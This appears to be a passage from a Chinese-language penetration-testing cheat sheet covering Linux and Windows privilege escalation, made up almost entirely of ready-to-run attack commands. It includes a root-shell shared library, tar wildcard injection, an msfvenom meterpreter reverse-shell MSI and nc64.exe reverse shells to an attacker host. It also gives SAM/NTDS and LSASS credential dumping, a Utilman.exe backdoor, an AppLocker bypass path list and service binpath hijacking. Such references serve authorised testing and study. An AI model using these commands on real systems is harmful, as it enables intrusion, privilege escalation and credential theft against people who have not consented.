<h5 id="中继"><a href="#中继" class="headerlink" title="中继"></a>中继</h5><p>二进制文件需要设置该位<code>SUID</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">/usr/sbin/relayd -C /etc/shadow<br></code></pre></td></tr></table></figure>

<h5 id="共享库配置错误"><a href="#共享库配置错误" class="headerlink" title="共享库配置错误"></a>共享库配置错误</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://tbhaxor.com/exploiting-shared-library-misconfigurations/">https://tbhaxor.com/exploiting-shared-library-misconfigurations/</a></p>
</blockquote>
<h6 id="shell-c-2"><a href="#shell-c-2" class="headerlink" title="shell.c"></a>shell.c</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="编译-2"><a href="#编译-2" class="headerlink" title="编译"></a>编译</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -shared -fPIC -nostartfiles -o &lt;FILE&gt;.so &lt;FILE&gt;.c<br></code></pre></td></tr></table></figure>

<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</a></p>
</blockquote>
<p>使用该命令<code>touch -- --checkpoint=1</code>将创建一个文件。为什么？因为<code>--</code>命令后面<code>touch</code>是告诉touch，有等待的选项。它不创建一个选项，而是创建一个名为<code>--checkpoint=1</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">touch -- --checkpoint=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">touch ./--checkpoint=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>因此，在创建<code>--checkpoint=1</code>文件后，我创建了另一个文件，该文件执行 shell 脚本。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">touch -- <span class="hljs-string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">touch ./--checkpoint-action=exec=&lt;FILE&gt;<br></code></pre></td></tr></table></figure>
<p>要删除配置错误的文件，请<code>./</code>在其前面添加 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rm ./<span class="hljs-string">&#x27;--checkpoint-action=exec=python script.sh&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="Linux-中的可写目录"><a href="#Linux-中的可写目录" class="headerlink" title="Linux 中的可写目录"></a>Linux 中的可写目录</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">/dev/shm<br>/tmp<br></code></pre></td></tr></table></figure>

<h4 id="微软Windows"><a href="#微软Windows" class="headerlink" title="微软Windows"></a>微软Windows</h4><h5 id="基本-Windows-枚举"><a href="#基本-Windows-枚举" class="headerlink" title="基本 Windows 枚举"></a>基本 Windows 枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">systeminfo<br>whoami /all<br>net user<br>net user /domain<br>net user &lt;USERNAME&gt;<br>tree /f C:\Users\<br>tasklist /SVC<br>sc query<br>sc qc &lt;SERVICE&gt;<br>netsh firewall show state<br>schtasks /query /fo LIST /v<br>findstr /si password *.xml *.ini *.txt<br>dir /s *pass* == *cred* == *vnc* == *.config*<br>accesschk.exe -uws <span class="hljs-string">&quot;Everyone&quot;</span> <span class="hljs-string">&quot;C:\Program Files\&quot;</span><br><span class="hljs-string">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="hljs-string">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object &#x27;Display Name&#x27;, &#x27;Start Mode&#x27;, Path</span><br></code></pre></td></tr></table></figure>

<h5 id="AppLocker-绕过列表"><a href="#AppLocker-绕过列表" class="headerlink" title="AppLocker 绕过列表"></a>AppLocker 绕过列表</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">Bypass <span class="hljs-title function_">List</span> <span class="hljs-params">(Windows <span class="hljs-number">10</span> Build <span class="hljs-number">1803</span>)</span>:<br>C:\Windows\Tasks<br>C:\Windows\Temp<br>C:\Windows\tracing<br>C:\Windows\Registration\CRMLog<br>C:\Windows\System32\FxsTmp<br>C:\Windows\System32\com\dmp<br>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br>C:\Windows\System32\spool\PRINTERS<br>C:\Windows\System32\spool\SERVERS<br>C:\Windows\System32\spool\drivers\color<br>C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter<br>C:\Windows\System32\<span class="hljs-title function_">Tasks_Migrated</span> <span class="hljs-params">(after peforming a version upgrade of Windows <span class="hljs-number">10</span>)</span><br>C:\Windows\SysWOW64\FxsTmp<br>C:\Windows\SysWOW64\com\dmp<br>C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter<br>C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System<br></code></pre></td></tr></table></figure>

<h5 id="访问检查"><a href="#访问检查" class="headerlink" title="访问检查"></a>访问检查</h5><h6 id="检查文件权限"><a href="#检查文件权限" class="headerlink" title="检查文件权限"></a>检查文件权限</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\accesschk.exe /accepteula -quvw <span class="hljs-string">&quot;C:\PATH\TO\FILE\&lt;FILE&gt;.exe&quot;</span><br></code></pre></td></tr></table></figure>

<h6 id="检查服务权限"><a href="#检查服务权限" class="headerlink" title="检查服务权限"></a>检查服务权限</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\accesschk.exe /accepteula -uwcqv &lt;USERNAME&gt; daclsvc<br></code></pre></td></tr></table></figure>

<h6 id="检查路径权限以查找未加引号的服务路径"><a href="#检查路径权限以查找未加引号的服务路径" class="headerlink" title="检查路径权限以查找未加引号的服务路径"></a>检查路径权限以查找未加引号的服务路径</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">.\accesschk.exe /accepteula -uwdq C:\<br>.\accesschk.exe /accepteula -uwdq <span class="hljs-string">&quot;C:\Program Files\&quot;</span><br><span class="hljs-string">.\accesschk.exe /accepteula -uwdq &quot;</span>C:\Program Files\&lt;UNQUOTED_SERVICE_PATH&gt;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<h6 id="检查注册表项"><a href="#检查注册表项" class="headerlink" title="检查注册表项"></a>检查注册表项</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\accesschk.exe /accepteula -uvwqk &lt;REGISTRY_KEY&gt;<br></code></pre></td></tr></table></figure>

<h5 id="将用户添加到组"><a href="#将用户添加到组" class="headerlink" title="将用户添加到组"></a>将用户添加到组</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">net user &lt;USERNAME&gt; &lt;PASSWORD&gt; /add /domain<br>net group <span class="hljs-string">&quot;Exchange Windows Permissions&quot;</span> /add &lt;USERNAME&gt;<br>net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> /add &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="启用远程桌面-RDP"><a href="#启用远程桌面-RDP" class="headerlink" title="启用远程桌面 (RDP)"></a>启用远程桌面 (RDP)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg add <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br>netsh advfirewall firewall <span class="hljs-built_in">set</span> rule group=<span class="hljs-string">&quot;remote desktop&quot;</span> new enable=yes<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Set-ItemProperty <span class="hljs-string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span> -Name <span class="hljs-string">&quot;fDenyTSConnections&quot;</span> -Value <span class="hljs-number">0</span>;<br>Set-ItemProperty <span class="hljs-string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27;</span> -Name <span class="hljs-string">&quot;UserAuthentication&quot;</span> -Value <span class="hljs-number">1</span>;<br>Enable-NetFirewallRule -DisplayGroup <span class="hljs-string">&quot;Remote Desktop&quot;</span>;<br></code></pre></td></tr></table></figure>

<h5 id="特权和权限"><a href="#特权和权限" class="headerlink" title="特权和权限"></a>特权和权限</h5><h6 id="始终安装提升"><a href="#始终安装提升" class="headerlink" title="始终安装提升"></a>始终安装提升</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer<br>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; -f msi &gt; &lt;FILE&gt;.msi<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msiexec /quiet /qn /i &lt;FILE&gt;.msi<br></code></pre></td></tr></table></figure>

<h6 id="SeBackup-和-SeRestore-权限"><a href="#SeBackup-和-SeRestore-权限" class="headerlink" title="SeBackup 和 SeRestore 权限"></a>SeBackup 和 SeRestore 权限</h6><h6 id="备份-SAM-和-SYSTEM-哈希值"><a href="#备份-SAM-和-SYSTEM-哈希值" class="headerlink" title="备份 SAM 和 SYSTEM 哈希值"></a>备份 SAM 和 SYSTEM 哈希值</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg save hklm\system C:\Users\&lt;USERNAME&gt;\system.hive<br>reg save hklm\sam C:\Users\&lt;USERNAME&gt;\sam.hive<br></code></pre></td></tr></table></figure>

<h6 id="转储哈希值"><a href="#转储哈希值" class="headerlink" title="转储哈希值"></a>转储哈希值</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump -sam sam.hive -system system.hive LOCAL<br></code></pre></td></tr></table></figure>

<h6 id="SeBackupPrivilege-权限升级-diskshadow"><a href="#SeBackupPrivilege-权限升级-diskshadow" class="headerlink" title="SeBackupPrivilege 权限升级 (diskshadow)"></a>SeBackupPrivilege 权限升级 (diskshadow)</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></p>
</blockquote>
<h6 id="PowerShell环境脚本"><a href="#PowerShell环境脚本" class="headerlink" title="PowerShell环境脚本"></a>PowerShell环境脚本</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">SET CONTEXT PERSISTENT NOWRITERSp<br>add volume c: alias foobarp<br>createp<br>expose %foobar% z:p<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">diskshadow /s &lt;FILE&gt;.txt<br></code></pre></td></tr></table></figure>

<h6 id="复制-ntds-dit"><a href="#复制-ntds-dit" class="headerlink" title="复制 ntds.dit"></a>复制 ntds.dit</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit<br></code></pre></td></tr></table></figure>

<h6 id="导出系统注册表值"><a href="#导出系统注册表值" class="headerlink" title="导出系统注册表值"></a>导出系统注册表值</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg save HKLM\SYSTEM c:\temp\system<br></code></pre></td></tr></table></figure>

<h6 id="提取哈希值"><a href="#提取哈希值" class="headerlink" title="提取哈希值"></a>提取哈希值</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL<br></code></pre></td></tr></table></figure>

<h6 id="通过-Robocopy-的替代方式"><a href="#通过-Robocopy-的替代方式" class="headerlink" title="通过 Robocopy 的替代方式"></a>通过 Robocopy 的替代方式</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg save hklm\sam C:\temp\sam<br>reg save hklm\system C:\temp\system<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">set</span> metadata C:\Windows\temp\meta.cabX<br><span class="hljs-built_in">set</span> context clientaccessibleX<br><span class="hljs-built_in">set</span> context persistentX<br>begin backupX<br>add volume C: alias cdriveX<br>createX<br>expose %cdrive% E:X<br>end backupX<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">diskshadow /s script.txt<br>robocopy /b E:\Windows\ntds . ntds.dit<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL<br></code></pre></td></tr></table></figure>

<h6 id="SeLoadDriverPrivilegy"><a href="#SeLoadDriverPrivilegy" class="headerlink" title="SeLoadDriverPrivilegy"></a>SeLoadDriverPrivilegy</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sc.exe query<br>$services=(get-service).name | foreach &#123;(Get-ServiceAcl $_)  | where &#123;$_.access.IdentityReference -match <span class="hljs-string">&#x27;Server Operators&#x27;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sc.exe config VSS binpath=<span class="hljs-string">&quot;C:\temp\nc64.exe -e cmd &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span><br>sc.exe stop VSS<br>sc.exe start VSS<br></code></pre></td></tr></table></figure>

<h6 id="SeTake所有权特权"><a href="#SeTake所有权特权" class="headerlink" title="SeTake所有权特权"></a>SeTake所有权特权</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">takeown /f C:\Windows\System32\Utilman.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">icacls C:\Windows\System32\Utilman.exe /grant Everyone:F<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Windows\System32\&gt; copy cmd.exe utilman.exe<br></code></pre></td></tr></table></figure>

<p>单击<code>Ease of Access</code>登录屏幕上的按钮即可获取具有权限的 shell <code>NT Authority\System</code>。</p>
<h6 id="SeImpersonate-和-SeAssignPrimaryToken-权限"><a href="#SeImpersonate-和-SeAssignPrimaryToken-权限" class="headerlink" title="SeImpersonate 和 SeAssignPrimaryToken 权限"></a>SeImpersonate 和 SeAssignPrimaryToken 权限</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RogueWinRM">https://github.com/antonioCoco/RogueWinRM</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\RogueWinRM.exe -p <span class="hljs-string">&quot;C:\&gt; .\nc64.exe&quot;</span> -a <span class="hljs-string">&quot;-e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="注册表处理"><a href="#注册表处理" class="headerlink" title="注册表处理"></a>注册表处理</h5><h6 id="启用彩色输出"><a href="#启用彩色输出" class="headerlink" title="启用彩色输出"></a>启用彩色输出</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>然后打开一个新的终端窗口。</p>
<h6 id="检查自动运行程序"><a href="#检查自动运行程序" class="headerlink" title="检查自动运行程序"></a>检查自动运行程序</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br></code></pre></td></tr></table></figure>

<h6 id="获取注册表项信息"><a href="#获取注册表项信息" class="headerlink" title="获取注册表项信息"></a>获取注册表项信息</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">req query &lt;REGISTRY_KEY&gt;<br></code></pre></td></tr></table></figure>

<h6 id="修改注册表键值"><a href="#修改注册表键值" class="headerlink" title="修改注册表键值"></a>修改注册表键值</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg add &lt;REGISTRY_KEY&gt; /v &lt;VALUE_TO_MODIFY&gt; /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\&lt;FILE&gt;.exe /f<br></code></pre></td></tr></table></figure>

<h5 id="搜索凭证"><a href="#搜索凭证" class="headerlink" title="搜索凭证"></a>搜索凭证</h5><h6 id="快速获胜"><a href="#快速获胜" class="headerlink" title="快速获胜"></a>快速获胜</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09">https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&amp;s=09</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/credentials_file_view.html">https://www.nirsoft.net/utils/credentials_file_view.html</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">cmdkey /<span class="hljs-built_in">list</span><br>rundll32 keymgr.dll, KRShowKeyMgr<br>reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br>reg query HKEY_CURRENT_USER\Software\&lt;USERNAME&gt;\PuTTY\Sessions\ /f <span class="hljs-string">&quot;Proxy&quot;</span> /s<br>type C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\Config\web.config | findstr connectionString<br></code></pre></td></tr></table></figure>

<h6 id="搜索密码"><a href="#搜索密码" class="headerlink" title="搜索密码"></a>搜索密码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">dir .s *pass* == *.config<br>findstr /si password *.xml *.ini *.txt<br>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue<br>Get-ChildItem -Path C:\Users\&lt;USERNAME&gt;\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction<br></code></pre></td></tr></table></figure>

<h6 id="PowerShell历史"><a href="#PowerShell历史" class="headerlink" title="PowerShell历史"></a>PowerShell历史</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure>

<h6 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cmdkey /<span class="hljs-built_in">list</span><br>runas /savecred /user:&lt;USERNAME&gt; cmd.exe<br></code></pre></td></tr></table></figure>

<h6 id="Winlogon-凭据"><a href="#Winlogon-凭据" class="headerlink" title="Winlogon 凭据"></a>Winlogon 凭据</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure>

<h6 id="本地管理员密码解决方案-LAPS"><a href="#本地管理员密码解决方案-LAPS" class="headerlink" title="本地管理员密码解决方案 (LAPS)"></a>本地管理员密码解决方案 (LAPS)</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\&gt; Get-ADComputer &lt;RHOST&gt; -property <span class="hljs-string">&#x27;ms-mcs-admpwd&#x27;</span><br></code></pre></td></tr></table></figure>

<h6 id="在注册表中搜索密码"><a href="#在注册表中搜索密码" class="headerlink" title="在注册表中搜索密码"></a>在注册表中搜索密码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query HKLM /f password /t REG_SZ /s<br>reg query HKCU /f password /t REG_SZ /s<br></code></pre></td></tr></table></figure>

<h6 id="转储凭证"><a href="#转储凭证" class="headerlink" title="转储凭证"></a>转储凭证</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">reg save hklm\system system<br>reg save hklm\sam sam<br>reg.exe save hklm\sam c:\temp\sam.save<br>reg.exe save hklm\security c:\temp\security.save<br>reg.exe save hklm\system c:\temp\system.save<br></code></pre></td></tr></table></figure>

<h6 id="查找-KeePass-数据库"><a href="#查找-KeePass-数据库" class="headerlink" title="查找 KeePass 数据库"></a>查找 KeePass 数据库</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br></code></pre></td></tr></table></figure>

<h6 id="互联网信息服务-IIS"><a href="#互联网信息服务-IIS" class="headerlink" title="互联网信息服务 (IIS)"></a>互联网信息服务 (IIS)</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Windows\System32\inetsrv&gt;appcmd.exe <span class="hljs-built_in">list</span> apppool /@:*<br>type C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\Config\web.config | findstr connectionString<br></code></pre></td></tr></table></figure>

<h6 id="PUTTY"><a href="#PUTTY" class="headerlink" title="PUTTY"></a>PUTTY</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query HKEY_CURRENT_USER\Software\&lt;USERNAME&gt;\PuTTY\Sessions\ /f <span class="hljs-string">&quot;Proxy&quot;</span> /s<br></code></pre></td></tr></table></figure>

<h6 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">tasklist<br>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <span class="hljs-number">688</span> C:\Users\Administrator\Documents\lsass.dmp full<br></code></pre></td></tr></table></figure>

<h6 id="无人值守的-Windows-安装"><a href="#无人值守的-Windows-安装" class="headerlink" title="无人值守的 Windows 安装"></a>无人值守的 Windows 安装</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br></code></pre></td></tr></table></figure>

<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">accesschk64.exe -qlc &lt;SERVICE&gt;<br>icacls C:\Users\&lt;USERNAME&gt;\&lt;FILE&gt;.exe /grant Everyone:F<br>sc config &lt;SERVICE&gt; binPath= <span class="hljs-string">&quot;C:\Users\&lt;USERNAME&gt;\&lt;FILE&gt;.exe&quot;</span> obj= LocalSystem<br>sc stop &lt;SERVICE&gt;<br>sc start &lt;SERVICE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="服务处理"><a href="#服务处理" class="headerlink" title="服务处理"></a>服务处理</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sc create &lt;SERVICE_NAME&gt;<br>sc start &lt;SERVICE_NAME&gt;<br>sc qc &lt;SERVICE_NAME&gt;<br></code></pre></td></tr></table></figure>

